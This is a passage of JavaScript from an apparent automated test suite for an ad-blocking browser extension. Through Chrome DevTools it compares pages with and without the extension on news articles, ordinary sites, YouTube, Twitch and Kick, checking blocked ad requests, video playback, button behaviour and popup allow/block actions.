    const why = [maxRtt > 2000 && "the worker took more than 2 s to answer", p.targetMs === null && "popup did not open", p.targetMs !== null && p.readyMs === null && "popup buttons not ready in 15 s", p.readyMs !== null && !(p.targetMs <= 3000 && p.readyMs <= 5000) && "popup too slow", p.popupErrors.length && "popup.js errors"].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + nums, data };
  });
}

// ---------- B: ads on news articles ----------
// A news story link: a dated path (cnn.com) first, else a path with a
// section and a long hyphenated last part. Hub, shopping and video pages are left out.
const ARTICLE_FINDER = String.raw`(() => {
  const here = location.hostname.replace(/^www\./, "");
  const ok = [];
  for (const a of document.querySelectorAll("a[href]")) {
    let u;
    try { u = new URL(a.href); } catch { continue; }
    if (!u.hostname.replace(/^www\./, "").endsWith(here) || u.search.length > 30) continue;
    const p = u.pathname;
    if (/video|live|gallery|photos|shopping|select|story\/|deals|podcast|newsletter/i.test(p)) continue;
    const parts = p.split("/").filter(Boolean);
    const last = parts[parts.length - 1] || "";
    if (/\/20\d\d\/\d\d\/\d\d\//.test(p)) ok.push([0, u.href]);
    else if (parts.length >= 2 && last.split("-").length >= 6) ok.push([1, u.href]);
  }
  ok.sort((x, y) => x[0] - y[0]);
  return ok.length ? ok[0][1] : "";
})()`;
async function findArticle(site, at) {
  const page = await openPage(base, site.url, at);
  await waitLoad(page, 20000);
  await sleep(2000);
  const url = await poll(() => evalIn(base, page.sessionId, ARTICLE_FINDER, 10000), 8000, 1000);
  await closePage(page);
  return url || "";
}
// adFrames: visible ad boxes that are an iframe or hold one (a real ad, not
// an empty "ADVERTISEMENT" placeholder).
const AD_BOXES = `(() => {
  const vis = (el) => { const r = el.getBoundingClientRect(); const cs = getComputedStyle(el); return r.width > 20 && r.height > 20 && cs.display !== "none" && cs.visibility !== "hidden"; };
  let n = 0, f = 0;
  for (const el of document.querySelectorAll(${JSON.stringify(AD_SELECTORS)})) if (vis(el)) { n++; if (el.tagName === "IFRAME" || [...el.querySelectorAll("iframe")].some(vis)) f++; }
  const main = document.querySelector("article, main, [role=main]");
  const h1 = document.querySelector("h1");
  return { adBoxes: n, adFrames: f, mainShown: !!main && vis(main), mainText: main ? main.innerText.length : 0, h1: h1 ? h1.innerText.slice(0, 80) : "", h1Shown: !!h1 && vis(h1) };
})()`;
// Ad boxes inside cross-origin frames (each has its own DevTools session).
async function frameBoxes(page) {
  let boxes = 0, frames = 0;
  for (const s of [...page.frames].slice(0, 40)) {
    try { const r = await evalIn(page.c, s, AD_BOXES, 3000); frames++; boxes += r.adBoxes || 0; } catch { guard(); }
  }
  return { boxes, frames };
}
const WINDOW_MS = 20000;
async function checkNewsAds(site) {
  const host = new URL(site.url).hostname;
  return check(`B-${site.id}`, `ad and tracker requests blocked on a ${host} article, article shown`, 120000, async (at, n) => {
    const url = (await findArticle(site, at)) || site.url;
    const [pe, pb] = await Promise.all([openPage(ext, url, at), openPage(base, url, at)]);
    await sleep(WINDOW_MS);
    // Scroll once, so lazy ad slots get their turn in both profiles.
    for (const p of [pe, pb]) await evalIn(p.c, p.sessionId, "window.scrollTo(0, 1500), true", 5000).catch(() => {});
    await sleep(4000);
    const [ie, ib] = await Promise.all([pageInfo(pe), pageInfo(pb)]);
    if (ib.wall || ie.wall) return { status: "SKIP", line: `bot wall (${ib.wall ? "baseline" : "extension"}): ${ib.wall ? ib.title : ie.title}` };
    const [be, bb] = await Promise.all([evalIn(ext, pe.sessionId, AD_BOXES).catch(() => ({})), evalIn(base, pb.sessionId, AD_BOXES).catch(() => ({}))]);
    const [fe, fb] = await Promise.all([frameBoxes(pe), frameBoxes(pb)]);
    const se = adStats(pe);
    const sb = adStats(pb);
    const shotE = await shot(pe, `B-${site.id}-ext-try${n}`);
    await shot(pb, `B-${site.id}-base-try${n}`);
    const consent = `consent banner ${ib.consent ? "shown" : "none"} (baseline), ${ie.consent ? "shown" : "none"} (extension)`;
    const data = { url, consentBase: !!ib.consent, consentExt: !!ie.consent, ext: { stats: se, boxes: be, frames: fe, info: ie, extErrors: pe.extErrors, uaHeaders: pe.uaHeaders }, base: { stats: sb, boxes: bb, frames: fb, info: ib, uaHeaders: pb.uaHeaders }, shot: shotE };
    const nums = `ad requests that loaded: ${se.ok} with the extension (${se.blocked} blocked), ${sb.ok} without (of ${sb.ad}); visible ad boxes ${be.adBoxes} vs ${bb.adBoxes} (with an ad frame: ${be.adFrames} vs ${bb.adFrames}); in cross-origin frames ${fe.boxes} vs ${fb.boxes} boxes (${fe.frames} vs ${fb.frames} frames); text ${ie.textLen} vs ${ib.textLen} chars; ${consent}; extension errors ${pe.extErrors.length}${pe.extErrors.length ? ": " + pe.extErrors[0] : ""}; ${shotE}`;
    if (sb.ad === 0) return { status: "SKIP", line: `baseline makes no request to a known ad host${ib.consent ? " (consent banner not accepted: the site holds its ads)" : ""}, nothing to judge; ${nums}`, data };
    // Few known ad requests in the baseline: judge by the ad boxes that hold
    // a real ad frame, when the baseline shows at least 3 of them.
    const byBoxes = sb.ok < 20;
    if (byBoxes && (bb.adFrames || 0) < 3) return { status: "SKIP", line: `baseline loads only ${sb.ok} ad requests from the known hosts and shows ${bb.adFrames || 0} ad boxes with an ad frame, too few to judge; ${nums}`, data };
    const blockedMost = byBoxes || se.ok <= 0.2 * sb.ok;
    const articleShown = (be.mainShown || be.h1Shown) && ie.textLen >= 0.5 * ib.textLen;
    const fewerBoxes = byBoxes ? be.adFrames <= Math.max(1, Math.floor(bb.adFrames / 2)) : be.adBoxes <= Math.max(1, Math.floor(bb.adBoxes / 2));
    const why = [!blockedMost && "more than 20% of the baseline ad requests loaded", !articleShown && "article not shown or text under half of baseline", !fewerBoxes && "visible ad boxes not at most half of baseline", pe.extErrors.length && "extension errors in the console"].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + (byBoxes ? `judged by ad boxes with an ad frame (baseline has ${sb.ok} known ad requests); ` : "") + nums, data };
  });
}
// A blocked request the page sends again and again (seen on cnn.com).
async function checkLoop(site) {
  const host = new URL(site.url).hostname;
  return check(`B-${site.id}-loop`, `no blocked request repeats in a loop on ${host}`, 60000, async (at, n) => {
    const [pe, pb] = await Promise.all([openPage(ext, site.url, at), openPage(base, site.url, at)]);
    await sleep(15000);
    const se = adStats(pe);
    const sb = adStats(pb);
    const data = { ext: { total: se.total, loop: se.loop, loopUrl: se.loopUrl }, base: { total: sb.total } };
    const nums = `requests in 15 s: ${se.total} with the extension, ${sb.total} without; most repeated blocked request: ${se.loopUrl || "none"} x ${se.loop}`;
    return { status: se.loop > 100 ? "FAIL" : "PASS", line: (se.loop > 100 ? "the page retries a blocked request in a loop (limit 100 in 15 s); " : "") + nums, data };
  });
}

// ---------- C: ordinary sites ----------
async function checkOrdinary(site) {
  const host = new URL(site.url).hostname;
  return check(`C-${site.id}`, `${host} works: main content shown, no extension errors, height like baseline`, 60000, async (at, n) => {
    const [pe, pb] = await Promise.all([openPage(ext, site.url, at), openPage(base, site.url, at)]);
    await Promise.all([waitLoad(pe, 20000), waitLoad(pb, 20000)]);
    await sleep(4000);
    const [ie, ib] = await Promise.all([pageInfo(pe), pageInfo(pb)]);
    if (ib.wall) return { status: "SKIP", line: "bot wall in the baseline too: " + ib.title };
    const mainQ = `(() => { const el = document.querySelector(${JSON.stringify(site.main)}); if (!el) return { shown: false, text: 0 }; const r = el.getBoundingClientRect(); return { shown: r.width > 50 && r.height > 50 && getComputedStyle(el).display !== "none", text: el.innerText.length }; })()`;
    const [me, mb] = await Promise.all([evalIn(ext, pe.sessionId, mainQ).catch(() => ({})), evalIn(base, pb.sessionId, mainQ).catch(() => ({}))]);
    const shotE = await shot(pe, `C-${site.id}-ext-try${n}`);
    await shot(pb, `C-${site.id}-base-try${n}`);
    const ratio = ib.height ? ie.height / ib.height : 0;
    const errs = pe.extErrors;
    const data = { ext: { info: ie, main: me, errors: errs }, base: { info: ib, main: mb } };
    const nums = `main ${me.shown ? "shown" : "missing"} (${me.text || 0} vs ${mb.text || 0} chars), height ${ie.height} vs ${ib.height} px (${ratio.toFixed(2)}), extension errors ${errs.length}${errs.length ? ": " + errs[0] : ""}; ${shotE}`;
    if (!mb.shown) return { status: "SKIP", line: "main content missing in the baseline too; " + nums, data };
    const why = [!me.shown && "main content not shown", errs.length && "extension errors in the console", (ratio < 0.7 || ratio > 1.3) && "height differs from baseline by more than 30%", ie.wall && "bot wall with the extension only"].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + nums, data };
  });
}

// ---------- D: YouTube ----------
const YT_SAMPLE = `(() => {
  const p = document.getElementById("movie_player");
  const v = document.querySelector("video.html5-main-video") || document.querySelector("video");
  let toast = false;
  for (const el of document.querySelectorAll("yt-notification-action-renderer, tp-yt-paper-toast, ytd-popup-container *[role=alert]")) {
    if (/Experiencing interruptions/i.test(el.textContent || "")) { const r = el.getBoundingClientRect(); if (r.width > 0 && r.height > 0 && getComputedStyle(el).display !== "none" && getComputedStyle(el).visibility !== "hidden") toast = true; }
  }
  const t = document.body ? document.body.innerText.slice(0, 2000) : "";
  let vid = "";
  try { vid = p && p.getVideoData ? p.getVideoData().video_id : ""; } catch {}
  return { ad: !!p && p.classList.contains("ad-showing"), t: v ? v.currentTime : -1, paused: v ? v.paused : null, toast, vid,
    wall: /sign in to confirm|not a bot|before you continue/i.test(t), unavailable: /video unavailable|this video isn't available/i.test(t) };
})()`;
const ytSample = (c, sid) => evalIn(c, sid, YT_SAMPLE, 5000).catch(() => { guard(); return null; });
// Waits until the main video plays (no ad, clock over 1 s). vid: only this video counts.
async function ytWaitPlay(c, sid, maxMs, res, vid) {
  const t0 = Date.now();
  while (Date.now() - t0 < maxMs) {
    const s = await ytSample(c, sid);
    if (s) {
      res.lastT = s.t;
      if (s.ad) res.adSeen = true;
      if (s.toast) res.toast = true;
      if (s.wall) res.wall = true;
      if (s.unavailable) res.unavailable = true;
      if (!s.ad && s.t > 1 && (!vid || s.vid === vid)) return (Date.now() - t0) / 1000;
    }
    await sleep(250);
  }
  return null;
}
async function ytWatch(c, url, at, label, n) {
  const page = await openPage(c, url, at);
  const res = { playSec: null, adSeen: false, toast: false, wall: false, unavailable: false, lastT: -1, playT: null, finalT: null };
  res.playSec = await ytWaitPlay(c, page.sessionId, 30000, res);
  // Watch on for 15 s more: the "Experiencing interruptions" toast comes some
  // seconds into the video, and the clock must keep moving (no stall).
  if (res.playSec !== null) {
    res.playT = res.lastT;
    const t1 = Date.now();
    while (Date.now() - t1 < 15000) {
      const s = await ytSample(c, page.sessionId);
      if (s && s.ad) res.adSeen = true;
      if (s && s.toast) res.toast = true;
      if (s) res.finalT = s.t;
      await sleep(500);
    }
  }
  res.stalled = res.playSec !== null && !(res.finalT - res.playT >= 8);
  res.shot = await shot(page, `D-youtube-${label}-try${n}`);
  res.extErrors = page.extErrors.slice(0, 3);
  await closePage(page);
  return res;
}
// One video for all D checks: from the front page, else the fixed id.
let ytPick = null;
async function pickYtId(at) {
  if (ytPick) return ytPick;
  const front = await openPage(base, "https://www.youtube.com/", at);
  await waitLoad(front, 15000);
  await sleep(2000);
  const id = await evalIn(base, front.sessionId, `(() => { const a = document.querySelector("a#thumbnail[href*='watch?v='], a[href^='/watch?v=']"); return a ? new URL(a.href).searchParams.get("v") : ""; })()`).catch(() => "");
  await closePage(front);
  ytPick = id ? { id, source: "front page" } : { id: YT_FALLBACK, source: "fixed id (front page has no video when not signed in)" };
  return ytPick;
}
const secs = (v) => (v === null || v === undefined ? "never" : v.toFixed(1) + " s");
async function checkYouTube() {
  return check("D-youtube", "YouTube watch page plays without an ad within 30 s and keeps playing for 15 s (not signed in)", 150000, async (at, n) => {
    const { id, source } = await pickYtId(at);
    const url = "https://www.youtube.com/watch?v=" + id;
    const [re, rb] = await Promise.all([ytWatch(ext, url, at, "ext", n), ytWatch(base, url, at, "base", n)]);
    const data = { url, source, ext: re, base: rb };
    const nums = `video ${id} (${source}); with the extension: plays after ${secs(re.playSec)}, clock ${re.playT === null ? "-" : re.playT.toFixed(1)} to ${re.finalT === null ? "-" : re.finalT.toFixed(1)} s in the next 15 s, ad ${re.adSeen ? "shown" : "none"}, toast ${re.toast ? "shown" : "none"}, extension errors ${re.extErrors.length}${re.extErrors.length ? ": " + re.extErrors[0] : ""}; without: plays after ${secs(rb.playSec)}, ad ${rb.adSeen ? "shown" : "none"}; ${re.shot}`;
    if (rb.wall || re.wall) return { status: "SKIP", line: "YouTube asks to sign in (bot check); " + nums, data };
    if (rb.unavailable) return { status: "SKIP", line: "video unavailable; " + nums, data };
    if (rb.playSec === null && !rb.adSeen && re.playSec === null) return { status: "SKIP", line: "the video does not play in the baseline either; " + nums, data };
    const why = [re.playSec === null && "did not play within 30 s", re.adSeen && "an ad played", re.toast && "the Experiencing interruptions toast showed", re.stalled && "the clock stopped (stall)", re.extErrors.length && "extension errors in the console"].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + nums, data };
  });
}
// Clicks a related video (not the one that plays now) and returns its id.
const RELATED_CLICK = (cur) => `(() => {
  const links = [...document.querySelectorAll("#related a[href*='watch?v='], ytd-watch-next-secondary-results-renderer a[href*='watch?v=']")];
  for (const a of links) {
    let v = ""; try { v = new URL(a.href).searchParams.get("v"); } catch {}
    if (!v || v === ${JSON.stringify(cur)} || /[?&]list=/.test(a.href)) continue;
    const r = a.getBoundingClientRect();
    if (r.width < 20 || r.height < 20) continue;
    a.scrollIntoView({ block: "center" });
    a.click();
    return v;
  }
  return "";
})()`;
async function ytChain(c, url, at, label, n) {
  const page = await openPage(c, url, at);
  const res = { firstSec: null, clicks: [], adSeen: false, wall: false, lastT: -1 };
  res.firstSec = await ytWaitPlay(c, page.sessionId, 30000, res);
  let cur = new URL(url).searchParams.get("v");
  for (let i = 0; i < 5 && res.firstSec !== null; i++) {
    const v = await evalIn(c, page.sessionId, RELATED_CLICK(cur), 5000).catch(() => { guard(); return ""; });
    if (!v) { res.clicks.push({ v: "", sec: null, note: "no related video found" }); break; }
    const r = { adSeen: false };
    const sec = await ytWaitPlay(c, page.sessionId, 12000, r, v);
    res.clicks.push({ v, sec, ad: r.adSeen });
    if (r.adSeen) res.adSeen = true;
    cur = v;
    if (sec === null) break;
  }
  res.shot = await shot(page, `D-chain-${label}-try${n}`);
  res.extErrors = page.extErrors.slice(0, 3);
  await closePage(page);
  return res;
}
async function checkYouTubeChain() {
  return check("D-youtube-chain", "YouTube: five related videos one after the other each play within 12 s (black screen time)", 240000, async (at, n) => {
    const { id } = await pickYtId(at);
    const url = "https://www.youtube.com/watch?v=" + id;
    const [re, rb] = await Promise.all([ytChain(ext, url, at, "ext", n), ytChain(base, url, at, "base", n)]);
    const list = (r) => r.clicks.map((k) => (k.v ? secs(k.sec) + (k.ad ? " (ad)" : "") : k.note)).join(", ") || "none";
    const data = { url, ext: re, base: rb };
    const nums = `seconds to play after each click, with the extension: ${list(re)}; without: ${list(rb)}; first video ${secs(re.firstSec)} vs ${secs(rb.firstSec)}; extension errors ${re.extErrors.length}; ${re.shot}`;
    if (re.wall || rb.wall) return { status: "SKIP", line: "YouTube asks to sign in (bot check); " + nums, data };
    if (re.firstSec === null && rb.firstSec === null) return { status: "SKIP", line: "the first video does not play in either profile; " + nums, data };
    const done = re.clicks.filter((k) => k.v && k.sec !== null).length;
    if (!re.clicks.some((k) => k.v) && !rb.clicks.some((k) => k.v)) return { status: "SKIP", line: "no related video link found in either profile; " + nums, data };
    const why = [re.firstSec === null && "the first video did not play", re.firstSec !== null && done < 5 && `only ${done} of 5 clicks played within 12 s`, re.adSeen && "an ad played", re.extErrors.length && "extension errors in the console"].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + nums, data };
  });
}
// Share, then Copy link: the toast shows and the link is on the clipboard.
// More actions opens a menu. Save opens a menu or a sign-in dialog.
const YT_OPEN_LAYERS = `(() => [...document.querySelectorAll("ytd-menu-popup-renderer, yt-list-view-model, yt-sheet-view-model, tp-yt-paper-dialog, ytd-modal-with-title-and-button-renderer, ytd-unified-share-panel-renderer, ytd-add-to-playlist-renderer, yt-contextual-sheet-layout")].filter((el) => { const r = el.getBoundingClientRect(); const cs = getComputedStyle(el); return r.width > 20 && r.height > 20 && cs.display !== "none" && cs.visibility !== "hidden"; }).length)()`;
const FIND_SHARE = `[...document.querySelectorAll("ytd-watch-metadata button[aria-label='Share'], #top-level-buttons-computed button[aria-label='Share']")].find((b) => b.getBoundingClientRect().width > 0)`;
const FIND_COPY = `[...document.querySelectorAll("yt-copy-link-renderer button, #copy-button button, button[aria-label='Copy']")].find((b) => b.getBoundingClientRect().width > 0)`;
const FIND_MORE = `[...document.querySelectorAll("ytd-watch-metadata button[aria-label='More actions'], #actions button[aria-label='More actions']")].find((b) => b.getBoundingClientRect().width > 0)`;
const FIND_SAVE = `[...document.querySelectorAll("ytd-watch-metadata button[aria-label='Save to playlist'], ytd-menu-service-item-renderer, yt-list-item-view-model, tp-yt-paper-item")].find((b) => b.getBoundingClientRect().width > 0 && (/Save to playlist/.test(b.getAttribute("aria-label") || "") || /^\\s*Save\\s*$/.test(b.innerText || "")))`;
async function ytButtons(c, url, at, label, n) {
  await c.send("Browser.grantPermissions", { origin: "https://www.youtube.com", permissions: ["clipboardReadWrite", "clipboardSanitizedWrite"] });
  const page = await openPage(c, url, at, { focus: true });
  const sid = page.sessionId;
  const res = { share: null, copied: null, clip: "", more: null, save: null, wall: false, lastT: -1, adSeen: false };
  await ytWaitPlay(c, sid, 25000, res);
  await evalIn(c, sid, "navigator.clipboard.writeText('before').then(() => true, () => false)", 5000).catch(() => false);
  const esc = async () => { for (const type of ["keyDown", "keyUp"]) await c.send("Input.dispatchKeyEvent", { type, key: "Escape", code: "Escape", windowsVirtualKeyCode: 27 }, sid).catch(() => {}); await sleep(500); };
  res.share = await clickEl(c, sid, FIND_SHARE);
  if (res.share) {
    await poll(() => evalIn(c, sid, FIND_COPY + " ? true : false", 3000), 6000, 300);
    const copyClicked = await clickEl(c, sid, FIND_COPY);
    res.copied = copyClicked ? !!(await poll(() => evalIn(c, sid, `/Link copied/i.test(document.body.innerText)`, 3000), 5000, 250)) : false;
    res.clip = String(await evalIn(c, sid, "navigator.clipboard.readText().catch((e) => 'error ' + e.name)", 5000).catch(() => "")).slice(0, 80);
    await esc();
    await esc();
  }
  const layers0 = await evalIn(c, sid, YT_OPEN_LAYERS, 3000).catch(() => 0);
  if (await clickEl(c, sid, FIND_MORE)) res.more = !!(await poll(async () => (await evalIn(c, sid, YT_OPEN_LAYERS, 3000)) > layers0, 4000, 250));
  else res.more = false;
  // Save: a button of its own, or an item in the More menu that is open now.
  if (!(await evalIn(c, sid, FIND_SAVE + " ? true : false", 3000).catch(() => false))) { await esc(); await clickEl(c, sid, FIND_MORE); await sleep(800); }
  const layers1 = await evalIn(c, sid, YT_OPEN_LAYERS, 3000).catch(() => 0);
  if (await clickEl(c, sid, FIND_SAVE)) {
    res.save = !!(await poll(async () => (await evalIn(c, sid, YT_OPEN_LAYERS, 3000)) >= Math.max(1, layers1) && /sign in|save video to|watch later|new playlist/i.test(await evalIn(c, sid, `[...document.querySelectorAll("ytd-popup-container, tp-yt-iron-dropdown, yt-sheet-view-model")].map((e) => e.innerText).join(" ")`, 3000)), 5000, 250));
  } else res.save = false;
  res.shot = await shot(page, `D-buttons-${label}-try${n}`);
  res.extErrors = page.extErrors.slice(0, 3);
  await closePage(page);
  return res;
}
async function checkYouTubeButtons() {
  return check("D-youtube-buttons", "YouTube: Share then Copy link copies (toast), More opens a menu, Save opens a menu or a sign-in dialog", 150000, async (at, n) => {
    const { id } = await pickYtId(at);
    const url = "https://www.youtube.com/watch?v=" + id;
    // One after the other: in a headful run both browsers share the OS clipboard.
    const re = await ytButtons(ext, url, at, "ext", n);
    const rb = await ytButtons(base, url, at, "base", n);
    const yn = (v) => (v === null ? "-" : v ? "yes" : "no");
    const data = { url, ext: re, base: rb };
    const nums = `with the extension: share ${yn(re.share)}, link copied ${yn(re.copied)} (clipboard "${re.clip}"), more menu ${yn(re.more)}, save ${yn(re.save)}; without: share ${yn(rb.share)}, link copied ${yn(rb.copied)} (clipboard "${rb.clip}"), more menu ${yn(rb.more)}, save ${yn(rb.save)}; extension errors ${re.extErrors.length}; ${re.shot}`;
    if (re.wall || rb.wall) return { status: "SKIP", line: "YouTube asks to sign in (bot check); " + nums, data };
    const parts = [["link copied", re.copied, rb.copied], ["more menu", re.more, rb.more], ["save", re.save, rb.save]];
    const judged = parts.filter((p) => p[2]);
    if (!judged.length) return { status: "SKIP", line: "no step works in the baseline either (YouTube changed its buttons?); " + nums, data };
    const why = judged.filter((p) => !p[1]).map((p) => p[0] + " works without the extension only");
    if (re.extErrors.length) why.push("extension errors in the console");
    const notJudged = parts.filter((p) => !p[2]).map((p) => p[0]);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + (notJudged.length ? "not judged (fails in the baseline too): " + notJudged.join(", ") + "; " : "") + nums, data };
  });
}

// ---------- E: Twitch and Kick ----------
// Each selector of adQuery is tested alone, so the report names the one that matched.
const STREAM_SAMPLE = (adQuery) => `(() => {
  const vs = [...document.querySelectorAll("video")].filter((v) => v.getBoundingClientRect().width > 200);
  const v = vs.sort((a, b) => b.getBoundingClientRect().width - a.getBoundingClientRect().width)[0];
  let adMatch = "";
  for (const q of ${JSON.stringify(adQuery)}) { const el = document.querySelector(q); if (el) { adMatch = q + " -> " + el.outerHTML.slice(0, 120); break; } }
  if (!adMatch && /commercial break|ad break/i.test((document.querySelector("[data-a-target='video-player'], #video-player, .video-player") || {}).innerText || "")) adMatch = "text: commercial break / ad break";
  const t = document.body ? document.body.innerText : "";
  return { t: v ? v.currentTime : -1, paused: v ? v.paused : null, ad: !!adMatch, adMatch, gate: !!document.querySelector("[data-a-target*='content-classification-gate'], [data-a-target='player-overlay-mature-accept']") || /for mature viewers only|must be 18 or older|intended for certain audiences/i.test(t),
    wall: /just a moment|verify you are human|security check/i.test(document.title + " " + t.slice(0, 1500)), offline: /is offline|offline/i.test((document.querySelector("[data-a-target='player-overlay-content-gate'], .channel-status-info") || {}).innerText || "") };
})()`;
async function streamWatch(c, url, at, adQuery, label, n) {
  const page = await openPage(c, url, at);
  const t0 = Date.now();
  const res = { startT: null, playSec: null, ad: false, adMatch: "", gate: false, wall: false, lastT: -1 };
  while (Date.now() - t0 < 30000) {
    const s = await evalIn(c, page.sessionId, STREAM_SAMPLE(adQuery), 5000).catch(() => { guard(); return null; });
    if (s) {
      res.lastT = s.t;
      if (s.ad) { res.ad = true; res.adMatch = res.adMatch || s.adMatch; }
      if (s.gate) res.gate = true;
      if (s.wall) res.wall = true;
      if (s.t > 0 && res.startT === null) res.startT = { t: s.t, at: Date.now() };
      // Plays: the clock moved at least 2 s since it first moved.
      if (res.startT && s.t - res.startT.t >= 2 && !s.paused) { res.playSec = (Date.now() - t0) / 1000; break; }
      if (s.gate || s.wall) break;
    }
    await sleep(500);
  }
  res.shot = await shot(page, `E-${label}-try${n}`);
  res.extErrors = page.extErrors.slice(0, 3);
  await closePage(page);
  return res;
}
async function codecs(at) {
  const page = await openPage(ext, "about:blank", at);
  const r = await evalIn(ext, page.sessionId, `({ h264: MediaSource.isTypeSupported('video/mp4; codecs="avc1.4d401f"'), aac: MediaSource.isTypeSupported('audio/mp4; codecs="mp4a.40.2"') })`).catch(() => ({}));
  await closePage(page);
  return r;
}
const STREAM_LIMIT_MS = 150000;
async function checkStream(name, finderUrl, finderJs, adQuery) {
  return check(`E-${name}`, `${name} live channel plays (not signed in), ad marker`, STREAM_LIMIT_MS, async (at, n) => {
    const t0 = Date.now();
    const cod = await codecs(at);
    if (!cod.h264) return { status: "SKIP", line: "this Chrome cannot play H.264 (MediaSource), live streams need it" };
    const f = await openPage(base, finderUrl, at);
    await waitLoad(f, 20000);
    const links = await poll(() => evalIn(base, f.sessionId, finderJs, 10000).then((l) => (l && l.length ? l : null)), 15000, 1000) || [];
    const fi = await pageInfo(f);
    await closePage(f);
    if (fi.wall) return { status: "SKIP", line: `bot wall on ${finderUrl}: ${fi.title}` };
    if (!links.length) return { status: "SKIP", line: `no live channel found on ${finderUrl}` };
    const tried = [];
    for (const url of links.slice(0, 3)) {
      // One channel needs up to about 35 s: stop before the time limit, with SKIP.
      if (STREAM_LIMIT_MS - (Date.now() - t0) < 40000) break;
      const [re, rb] = await Promise.all([streamWatch(ext, url, at, adQuery, name + "-ext", n), streamWatch(base, url, at, adQuery, name + "-base", n)]);
      tried.push({ url, ext: re, base: rb });
      if (re.gate || rb.gate) continue; // a mature-content gate: try the next channel, never click it
      if (re.wall || rb.wall) return { status: "SKIP", line: `bot wall on ${url}`, data: { tried } };
      if (rb.playSec === null && re.playSec === null) continue; // offline or not playable in the baseline
      const adNote = rb.ad ? "" : "ad part not tested: no ad marker in the baseline either; ";
      const nums = `${url.replace(/^https:\/\//, "")} (channel ${tried.length} of ${tried.length} tried${tried.length > 1 ? ", earlier: " + tried.slice(0, -1).map((x) => x.url.replace(/^https:\/\/(www\.)?/, "") + (x.ext.gate || x.base.gate ? " gate" : " no play")).join(", ") : ""}): with the extension plays after ${secs(re.playSec)}, ad marker ${re.ad ? "shown (" + re.adMatch + ")" : "none"}; without: plays after ${secs(rb.playSec)}, ad marker ${rb.ad ? "shown (" + rb.adMatch + ")" : "none"}; extension errors ${re.extErrors.length}${re.extErrors.length ? ": " + re.extErrors[0] : ""}; ${re.shot}`;
      const why = [re.playSec === null && "did not play within 30 s", re.ad && "an ad marker showed", re.extErrors.length && "extension errors in the console"].filter(Boolean);
      return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + adNote + nums, data: { tried, adTested: !!rb.ad } };
    }
    return { status: "SKIP", line: `no playable live channel among ${tried.length} tried (gate, offline or no play in the baseline)`, data: { tried } };
  });
}
const TWITCH_FINDER = `(() => [...new Set([...document.querySelectorAll("a[data-a-target='preview-card-image-link'], a[data-a-target='preview-card-channel-link']")].map((a) => a.href).filter((h) => /^https:\\/\\/www\\.twitch\\.tv\\/[A-Za-z0-9_]+$/.test(h)))].slice(0, 5))()`;
const TWITCH_AD = ["[data-a-target='video-ad-label']", "[data-a-target='video-ad-countdown']", "[data-test-selector='ad-banner-default-text']"];
// Kick: channel links that show a viewer count or LIVE (live now). The
// "Rank" list (top channels of the week) shows offline channels too.
const KICK_FINDER = String.raw`(() => {
  const live = [...document.querySelectorAll("a[href]")].filter((a) => /^https:\/\/kick\.com\/[A-Za-z0-9_-]+$/.test(a.href) && /(^|\s)(\d[\d.,]*K?|LIVE)$/.test(a.innerText.replace(/\s+/g, " ").trim()) && !/^Rank/.test(a.innerText.trim()));
  const urls = [...new Set(live.map((a) => a.href))];
  return urls.length >= 3 ? urls.slice(0, 6) : [];
})()`;
// An "ad" word in the test id, not any id that holds the letters "ad-" (head-, load-, badge-).
const KICK_AD = ["[class*='ad-overlay']", "[data-testid^='ad-']", "[data-testid*='-ad-']", "[data-testid$='-ad']"];

// ---------- F: popup actions ----------
// Lists on: a page blocks many requests (blockedAll). Lists off on the host
// (Allow, or step 2 of Fix): known ad requests load, or the blocked count
// falls to under a fifth. The second rule also works on a site that holds its
// ads behind a consent banner (cnn.com).
const listsOff = (before, after) => (after.ok >= before.ok + 10 && after.ok >= 2 * before.ok) || (before.blockedAll >= 20 && after.blockedAll <= 0.2 * before.blockedAll);
const listsOn = (before, after) => after.ok <= Math.max(before.ok + 5, 0.2 * Math.max(before.ok, 1) + 5) && (before.blockedAll < 20 || after.blockedAll >= 0.3 * before.blockedAll);
const W = 10000;
async function checkActions(site, { allow = true, fixNo = true, fixYes = true } = {}) {
  const host = new URL(site.url).hostname;
  const load = async (page) => { await reloadPage(page); await sleep(W); return adStats(page); };
  const fresh = async (at) => { await resetSite(host); const p = await openPage(ext, site.url, at); await sleep(W); return p; };
  const cleanup = () => resetSite(host);
  const counts = (s) => `${s.ok} ad loaded / ${s.blockedAll} blocked`;
  const results = [];
  // F1: Allow this site, then Block again.
  if (allow) results.push(await check(`F-${site.id}-allow`, `Allow this site on ${host}: requests pass after reload; Block again: blocked again ${VIA}`, 180000, async (at, n) => {
    const page = await fresh(at);
    const before = adStats(page);
    let p = await openPopup(page, host);
    if (p.readyMs === null) return { status: "FAIL", line: `popup not ready (${p.state && p.state.host}); ${await shot(page, `F-${site.id}-allow-page-try${n}`)}` };
    if (/Block again/.test(p.state.allowText)) return { status: "FAIL", line: "the site was allowed at the start, after the reset" };
    await popupClick(p.session, "allow-site");
    const saved = await poll(async () => { const o = await overridesOf(host); return o && o.enabled === false; }, 8000);
    const rule = await poll(() => allowRuleFor(host), 10000);
    const label1 = (await evalIn(ext, p.session, POPUP_STATE).catch(() => ({}))).allowText;
    const errs = [...p.popupErrors];
    await closePopups();
    const allowed = await load(page);
    const shotA = await shot(page, `F-${site.id}-allow-allowed-try${n}`);
    p = await openPopup(page, host);
    const blockText = p.state && p.state.allowText;
    if (p.session) await popupClick(p.session, "allow-site");
    const unsaved = await poll(async () => { const o = await overridesOf(host); return !o || o.enabled !== false; }, 8000);
    const ruleGone = await poll(async () => !(await allowRuleFor(host)), 10000);
    errs.push(...p.popupErrors);
    await closePopups();
    const again = await load(page);
    const info = await pageInfo(page);
    const data = { before, allowed, again, saved, rule, ruleGone, label1, blockText, consent: !!info.consent, popupErrors: errs, extErrors: page.extErrors };
